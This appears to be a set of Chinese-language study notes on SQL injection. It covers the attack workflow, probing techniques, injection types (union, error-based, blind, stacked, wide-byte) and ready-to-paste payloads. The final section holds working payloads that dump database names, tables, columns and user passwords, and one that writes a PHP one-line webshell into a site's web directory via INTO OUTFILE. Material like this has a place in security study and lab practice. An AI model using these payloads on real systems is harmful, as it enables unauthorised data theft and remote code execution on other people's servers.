# 基础部分

## 一、基本步骤

```bash
# 收集信息
	- 数据库信息、版本、用户、权限
# 获取数据
	- 获取库信息（当前库，所有库）、表信息、列信息、数据
# 提权
	- 根据数据库权限
		- 执行系统命令（直接提权）
	- 读文件
		- 读取数据库配置文件，尝试远程连接
		- 读取系统配置文件，搜集信息
	- 写文件
		- 写webshell到网站目录
```

## 二、产生原因

```bash
$id = $GET['id'];	// 1

$sql = "select * from user where id = $id";	// id = 1 and drop database user


# 产生的原因总结
	程序员开发的代码未对用户提交的参数进行合法性校验;
	导致传递的参数可以重新构造成其他效果的参数打入数据库;
```

## 三、探测方法

```bash
?id=1 and 1=1 --+
?id=1 and 1=2 --+
and or xor
&&  %26%26
||  %7c%7c

## 探测字段数
order by [num]
## 取余
mod(10,3) in (1) --+
```

## 四、分类与攻击方式

### 1,分类

数值型、字符串型、搜索型；

### 2,攻击方式

1）union拼接

?id=1 union select {sql...} --+

2）函数报错法

kobe' and updatexml(1,concat(0x7e,(seelct version()),0x7e),2) --+

3）盲注

时间性、

sleep(5) --+

布尔型、

ascii(substr(database(database(),1,1))) = 112 --+

dnslog...

4）堆叠注入

sql;select name from user;sql...

5）宽字节注入

> GBK编码；开启了魔术符号；

原理：转义字符 \ 的url编码%5c与%df正好组成一个汉字，导致转义字符失效。

```bash
kobe%df' union select ... ;
```

## 五、sql示例

探测当前页面数据个数

```bash
kevin' order by [1++];
```

联合查询显示关键信息

```bash
kevin' union select user(),select version(),select database() #
```

获取所有库

```bash
kevin' union select group_concat(schema_name),2 from information_schema.schemata #
```

获取所有表

```bash
kevin' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
```

爆字段

```bash
kevin' union select group_concat(column_name),2 from information_schema.columns where table_name="user" #
```

爆数据

```bash
kevin' union select group_concat(user_id,0x7e,first_name,0x7e,password),2 from users #
```

写一句话木马

> 前提：数据库用户高权限；拿到目标代码目录路径；数据库配置my.ini开启允许全局访问；

```bash
kevin' union select "<?php @eval($_POST[123]);?>",2 into outfile  "c:/phpstudy/www/muma.php" #
```













